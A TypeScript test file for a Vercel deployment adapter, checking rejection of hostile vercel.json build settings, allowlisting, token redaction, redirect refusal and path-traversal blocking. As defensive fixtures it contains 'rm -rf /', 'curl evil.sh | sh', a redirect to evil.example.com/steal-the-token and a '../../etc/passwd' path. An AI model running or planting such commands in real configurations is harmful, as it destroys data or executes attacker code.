import { createHash } from 'node:crypto'
import { mkdtemp, readFile, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import * as path from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { createLocalManualDeployProvider } from './local-manual.js'
import type { DeployFile, DeployProvider } from './provider.js'
import {
  assertPrebuiltArtifactOnly,
  createVercelDeployProvider,
  HostileArtifactError,
  VercelAdapterError,
} from './vercel-adapter.js'

const TEAM_ID = 'team_abc123'
const FAKE_TOKEN = 'vercel_test_token_should_never_leak_ANY7x9Q'

function jsonResponse(body: unknown, status = 200): Response {
  return new Response(JSON.stringify(body), {
    status,
    headers: { 'Content-Type': 'application/json' },
  })
}

/** A `fetchImpl` mock that records every call and answers from a queue — the same pattern this repo already uses for injected-fetch tests (e.g. `src/mail/gmail-connect.test.ts`). */
function mockFetch(responses: Response[]) {
  const calls: { url: string; init: RequestInit | undefined }[] = []
  const queue = [...responses]
  const fn = vi.fn(async (url: string | URL, init?: RequestInit) => {
    calls.push({ url: url.toString(), init })
    const next = queue.shift()
    if (!next) throw new Error('mockFetch: ran out of queued responses')
    return next
  })
  return { fetchImpl: fn as unknown as typeof fetch, calls }
}

function baseConfig(fetchImpl: typeof fetch, overrides: { teamId?: string } = {}) {
  return {
    token: FAKE_TOKEN,
    teamId: overrides.teamId ?? TEAM_ID,
    fetchImpl,
    apiBase: 'https://api.vercel.com',
  }
}

describe('assertPrebuiltArtifactOnly', () => {
  it('accepts a plain Build Output API bundle with no vercel.json or crons', () => {
    const files: DeployFile[] = [
      { path: '.vercel/output/config.json', data: Buffer.from(JSON.stringify({ version: 3 })) },
      { path: '.vercel/output/static/index.html', data: Buffer.from('<html></html>') },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).not.toThrow()
  })

  it('rejects a root vercel.json declaring buildCommand', () => {
    const files: DeployFile[] = [
      { path: 'vercel.json', data: Buffer.from(JSON.stringify({ buildCommand: 'rm -rf /' })) },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a root vercel.json declaring installCommand', () => {
    const files: DeployFile[] = [
      {
        path: 'vercel.json',
        data: Buffer.from(JSON.stringify({ installCommand: 'curl evil.sh | sh' })),
      },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a root vercel.json declaring crons', () => {
    const files: DeployFile[] = [
      {
        path: 'vercel.json',
        data: Buffer.from(JSON.stringify({ crons: [{ path: '/api/x', schedule: '* * * * *' }] })),
      },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a nested vercel.json declaring build settings, not just the root', () => {
    const files: DeployFile[] = [
      {
        path: 'some/nested/dir/vercel.json',
        data: Buffer.from(JSON.stringify({ devCommand: 'evil' })),
      },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects .vercel/output/config.json declaring crons', () => {
    const files: DeployFile[] = [
      {
        path: '.vercel/output/config.json',
        data: Buffer.from(
          JSON.stringify({ version: 3, crons: [{ path: '/api/x', schedule: '0 * * * *' }] }),
        ),
      },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects an unparseable vercel.json outright — presence alone is refused, content is never examined', () => {
    const files: DeployFile[] = [{ path: 'vercel.json', data: Buffer.from('not json {{{') }]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a vercel.json with no build keys at all — a prebuilt artifact has no legitimate use for the file', () => {
    const files: DeployFile[] = [{ path: 'vercel.json', data: Buffer.from(JSON.stringify({})) }]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a nested vercel.json at any depth, regardless of content', () => {
    const files: DeployFile[] = [
      { path: 'a/b/c/vercel.json', data: Buffer.from(JSON.stringify({ innocuous: true })) },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects .vercel/output/config.json declaring a key outside the allowlist', () => {
    const files: DeployFile[] = [
      {
        path: '.vercel/output/config.json',
        data: Buffer.from(JSON.stringify({ version: 3, wildcard: [{ domain: 'evil.example' }] })),
      },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('rejects a malformed .vercel/output/config.json rather than ignoring it', () => {
    const files: DeployFile[] = [
      { path: '.vercel/output/config.json', data: Buffer.from('not json {{{') },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).toThrow(HostileArtifactError)
  })

  it('accepts a legitimate prebuilt artifact using only allowlisted config.json keys', () => {
    const files: DeployFile[] = [
      {
        path: '.vercel/output/config.json',
        data: Buffer.from(JSON.stringify({ version: 3, routes: [{ src: '/(.*)', dest: '/$1' }] })),
      },
      { path: '.vercel/output/static/index.html', data: Buffer.from('<html></html>') },
    ]
    expect(() => assertPrebuiltArtifactOnly(files)).not.toThrow()
  })
})

describe('createVercelDeployProvider — allowlist', () => {
  it('refuses a call the adapter never issues on its own (no route to trigger this outside the allowlist check itself)', async () => {
    // The allowlist is exercised indirectly by every method test below —
    // each one only succeeds because its call shape is on the list. This
    // test proves the checking FUNCTION refuses an out-of-list shape by
    // reaching it through a method and asserting the allowlist, not the
    // API response, is what's enforced: getDeploymentState with an id that
    // collides with a differently-shaped path is refused before any fetch
    // happens.
    const { fetchImpl, calls } = mockFetch([])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    // encodeURIComponent of a value containing a literal slash-shaped
    // sequence still cannot produce a second path segment, but an EMPTY
    // deploymentId is refused before ever reaching the network.
    await expect(
      provider.getDeploymentState({ teamId: TEAM_ID, deploymentId: '' }),
    ).rejects.toThrow(VercelAdapterError)
    expect(fetchImpl).not.toHaveBeenCalled()
    expect(calls).toHaveLength(0)
  })
})

describe('createVercelDeployProvider — team-id binding', () => {
  it('refuses createProject for a team id different from the bound connection', async () => {
    const { fetchImpl } = mockFetch([])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(
      provider.createProject({ teamId: 'team_someone_else', name: 'ht-module-x' }),
    ).rejects.toThrow(VercelAdapterError)
    expect(fetchImpl).not.toHaveBeenCalled()
  })

  it('refuses deleteProject for a team id different from the bound connection', async () => {
    const { fetchImpl } = mockFetch([])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(
      provider.deleteProject({ teamId: 'team_someone_else', projectId: 'prj_1' }),
    ).rejects.toThrow(VercelAdapterError)
    expect(fetchImpl).not.toHaveBeenCalled()
  })

  // F5: getDeploymentState was the one method with no assertTeam call —
  // harmless today only because vercelFetch always pins teamId from
  // config, but the file's own stated invariant ("every method... throws
  // if it doesn't match the bound value") wasn't actually true for it.
  it('refuses getDeploymentState for a team id different from the bound connection', async () => {
    const { fetchImpl } = mockFetch([])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(
      provider.getDeploymentState({ teamId: 'team_someone_else', deploymentId: 'dpl_1' }),
    ).rejects.toThrow(VercelAdapterError)
    expect(fetchImpl).not.toHaveBeenCalled()
  })
})

describe('createVercelDeployProvider — token never leaks', () => {
  it('a failing API call throws an error whose message contains no token substring', async () => {
    const { fetchImpl } = mockFetch([
      jsonResponse({ error: { message: `unauthorized for token ${FAKE_TOKEN}` } }, 401),
    ])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    let caught: unknown
    try {
      await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })
    } catch (err) {
      caught = err
    }
    expect(caught).toBeInstanceOf(VercelAdapterError)
    const message = (caught as Error).message
    expect(message).not.toContain(FAKE_TOKEN)
    expect(message).toContain('<redacted>')
  })

  it('never sends the token in a URL — only as an Authorization header', async () => {
    const { fetchImpl, calls } = mockFetch([jsonResponse({ id: 'prj_1' }, 200)])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })
    expect(calls[0].url).not.toContain(FAKE_TOKEN)
    const headers = calls[0].init?.headers as Record<string, string>
    expect(headers.Authorization).toBe(`Bearer ${FAKE_TOKEN}`)
  })

  it('setEnvVars never folds a response body echoing the submitted secret into the thrown error', async () => {
    // FIX (HIGH): apiError() (used by every other method) folds the
    // response body verbatim into the thrown message. That's fine for
    // createProject/createDeployment/etc — their request bodies never
    // carry a secret. But setEnvVars POSTs the Assistant token / webhook
    // signing secret as the env var VALUE, and redact() only scrubs this
    // connection's own Vercel token, not that value. A 400 that echoes an
    // "invalid value" back would have carried the secret into a message
    // that callers persist verbatim into module_install_events.detail
    // (permanent, jsonb) and the queue's dead-letter reason. setEnvVars
    // must never surface response text at all — only status and the KEY.
    const submittedSecret = 'assistant_bearer_super_secret_ANY7x9Q'
    const { fetchImpl } = mockFetch([
      jsonResponse(
        { error: { message: `invalid value: ${submittedSecret} is not permitted` } },
        400,
      ),
    ])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    let caught: unknown
    try {
      await provider.setEnvVars({
        teamId: TEAM_ID,
        projectId: 'prj_1',
        vars: [{ key: 'ASSISTANT_TOKEN', value: submittedSecret, sensitive: true }],
      })
    } catch (err) {
      caught = err
    }
    expect(caught).toBeInstanceOf(VercelAdapterError)
    const message = (caught as Error).message
    expect(message).not.toContain(submittedSecret)
    expect(message).toContain('ASSISTANT_TOKEN')
    expect(message).toContain('400')
  })
})

describe('createVercelDeployProvider — redirect refusal', () => {
  it('refuses to follow a redirect to a non-Vercel host', async () => {
    const redirect = new Response(null, {
      status: 302,
      headers: { Location: 'https://evil.example.com/steal-the-token' },
    })
    const { fetchImpl } = mockFetch([redirect])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })).rejects.toThrow(
      /disallowed host/,
    )
  })

  it('follows a single same-host redirect', async () => {
    const redirect = new Response(null, {
      status: 302,
      headers: { Location: 'https://api.vercel.com/v10/projects?teamId=team_abc123&x=1' },
    })
    const { fetchImpl } = mockFetch([redirect, jsonResponse({ id: 'prj_1' }, 200)])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    const result = await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })
    expect(result.projectId).toBe('prj_1')
  })

  it('refuses a same-host redirect to a path outside the allowlist (allowlist bypass via redirect)', async () => {
    // FIX (HIGH): assertAllowlisted originally ran once, against the path
    // this adapter itself constructed (`/v10/projects`) — the redirect
    // branch then re-issued the identical POST, with the same team-admin
    // Authorization header, at whatever path the response's Location
    // pointed to, checking ONLY the hostname. A same-host redirect from
    // `POST /v10/projects` to `/v1/teams/<team>/members` would have gone
    // through unchecked and hit an endpoint the allowlist never approved.
    // The fix re-runs assertAllowlisted against the redirect TARGET's path
    // before the second request is issued.
    const redirect = new Response(null, {
      status: 302,
      headers: {
        Location: 'https://api.vercel.com/v1/teams/team_abc123/members?role=OWNER',
      },
    })
    const { fetchImpl, calls } = mockFetch([redirect])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })).rejects.toThrow(
      /not in the compiled-in allowlist/,
    )
    // Only the original (allowlisted) request should have gone out — the
    // redirect target must never be fetched.
    expect(calls).toHaveLength(1)
  })
})

describe('createVercelDeployProvider — bounded response size', () => {
  it('refuses a response whose Content-Length exceeds the cap', async () => {
    const huge = new Response(JSON.stringify({ id: 'prj_1' }), {
      status: 200,
      headers: { 'Content-Length': String(50 * 1024 * 1024) },
    })
    const { fetchImpl } = mockFetch([huge])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    await expect(provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })).rejects.toThrow(
      /exceeds the .* byte cap|Content-Length/,
    )
  })
})

describe('createVercelDeployProvider — full lifecycle against a mocked API', () => {
  it('creates a project, uploads an artifact, deploys it, polls state, sets env vars, deletes it', async () => {
    const files: DeployFile[] = [
      { path: '.vercel/output/config.json', data: Buffer.from(JSON.stringify({ version: 3 })) },
      { path: '.vercel/output/static/index.html', data: Buffer.from('<html>hi</html>') },
    ]
    const { fetchImpl, calls } = mockFetch([
      jsonResponse({ id: 'prj_1' }), // createProject
      jsonResponse({}), // uploadArtifact file 1
      jsonResponse({}), // uploadArtifact file 2
      jsonResponse({ id: 'dpl_1', url: 'ht-module-x-abcd.vercel.app' }), // createDeployment
      jsonResponse({ readyState: 'READY', url: 'ht-module-x-abcd.vercel.app' }), // getDeploymentState
      jsonResponse({}), // setEnvVars
      jsonResponse({}), // deleteProject
    ])
    const provider: DeployProvider = createVercelDeployProvider(baseConfig(fetchImpl))

    const project = await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-x' })
    expect(project.projectId).toBe('prj_1')

    const upload = await provider.uploadArtifact({
      teamId: TEAM_ID,
      projectId: project.projectId,
      files,
    })
    expect(upload.uploadId.length).toBeGreaterThan(0)

    const deployment = await provider.createDeployment({
      teamId: TEAM_ID,
      projectId: project.projectId,
      uploadId: upload.uploadId,
      target: 'production',
    })
    expect(deployment.deploymentId).toBe('dpl_1')
    expect(deployment.url).toBe('https://ht-module-x-abcd.vercel.app')

    const state = await provider.getDeploymentState({
      teamId: TEAM_ID,
      deploymentId: deployment.deploymentId,
    })
    expect(state.state).toBe('ready')

    await provider.setEnvVars({
      teamId: TEAM_ID,
      projectId: project.projectId,
      vars: [{ key: 'FOO', value: 'bar', sensitive: false }],
    })

    await provider.deleteProject({ teamId: TEAM_ID, projectId: project.projectId })

    // createDeployment must never let a build run, regardless of anything
    // an artifact or a Vercel default might otherwise imply.
    const deployCall = calls.find(
      (c) => c.url.includes('/v13/deployments') && c.init?.method === 'POST',
    )
    const deployBody = JSON.parse(deployCall?.init?.body as string)
    expect(deployBody.projectSettings).toEqual({
      buildCommand: null,
      installCommand: null,
      framework: null,
    })

    // The file upload used the correct sha1 digest header.
    const uploadCall = calls.find((c) => c.url.includes('/v2/files'))
    const headers = uploadCall?.init?.headers as Record<string, string>
    const expectedSha = createHash('sha1').update(Buffer.from(files[0].data)).digest('hex')
    expect(headers['x-vercel-digest']).toBe(expectedSha)
  })

  it('refuses to deploy an artifact carrying its own build settings before any network call is made', async () => {
    const { fetchImpl } = mockFetch([])
    const provider = createVercelDeployProvider(baseConfig(fetchImpl))
    const files: DeployFile[] = [
      { path: 'vercel.json', data: Buffer.from(JSON.stringify({ installCommand: 'evil' })) },
    ]
    await expect(
      provider.uploadArtifact({ teamId: TEAM_ID, projectId: 'prj_1', files }),
    ).rejects.toThrow(HostileArtifactError)
    expect(fetchImpl).not.toHaveBeenCalled()
  })
})

describe('local-manual DeployProvider — proves the interface is vendor-neutral', () => {
  let outputDir: string

  beforeEach(async () => {
    outputDir = await mkdtemp(path.join(tmpdir(), 'ht-local-manual-'))
  })

  afterEach(async () => {
    await rm(outputDir, { recursive: true, force: true })
  })

  it('implements the full DeployProvider lifecycle by writing to disk', async () => {
    // Compile-time proof: this assignment only type-checks if
    // createLocalManualDeployProvider really returns a DeployProvider —
    // the same interface createVercelDeployProvider returns, with no
    // Vercel-shaped extension.
    const provider: DeployProvider = createLocalManualDeployProvider(TEAM_ID, { outputDir })

    const project = await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-y' })
    expect(project.projectId).toBe('ht-module-y')

    const files: DeployFile[] = [
      { path: '.vercel/output/static/index.html', data: Buffer.from('<html>hi</html>') },
    ]
    await provider.uploadArtifact({ teamId: TEAM_ID, projectId: project.projectId, files })

    const written = await readFile(
      path.join(outputDir, project.projectId, '.vercel/output/static/index.html'),
      'utf8',
    )
    expect(written).toBe('<html>hi</html>')

    const deployment = await provider.createDeployment({
      teamId: TEAM_ID,
      projectId: project.projectId,
      uploadId: 'unused-by-local-manual',
      target: 'production',
    })
    expect(deployment.url.startsWith('file://')).toBe(true)

    const state = await provider.getDeploymentState({
      teamId: TEAM_ID,
      deploymentId: deployment.deploymentId,
    })
    expect(state.state).toBe('ready')

    await provider.setEnvVars({
      teamId: TEAM_ID,
      projectId: project.projectId,
      vars: [{ key: 'FOO', value: 'bar', sensitive: true }],
    })
    const env = await readFile(path.join(outputDir, project.projectId, '.env.local'), 'utf8')
    expect(env).toBe('FOO=bar\n')

    await provider.deleteProject({ teamId: TEAM_ID, projectId: project.projectId })
    await expect(
      readFile(path.join(outputDir, project.projectId, '.env.local'), 'utf8'),
    ).rejects.toThrow()
  })

  it('refuses a team id different from the one it was bound to', async () => {
    const provider = createLocalManualDeployProvider(TEAM_ID, { outputDir })
    await expect(provider.createProject({ teamId: 'someone-else', name: 'x' })).rejects.toThrow()
  })

  it('refuses an artifact file path that would escape the project directory', async () => {
    const provider = createLocalManualDeployProvider(TEAM_ID, { outputDir })
    const project = await provider.createProject({ teamId: TEAM_ID, name: 'ht-module-z' })
    await expect(
      provider.uploadArtifact({
        teamId: TEAM_ID,
        projectId: project.projectId,
        files: [{ path: '../../etc/passwd', data: Buffer.from('pwned') }],
      }),
    ).rejects.toThrow()
  })
})
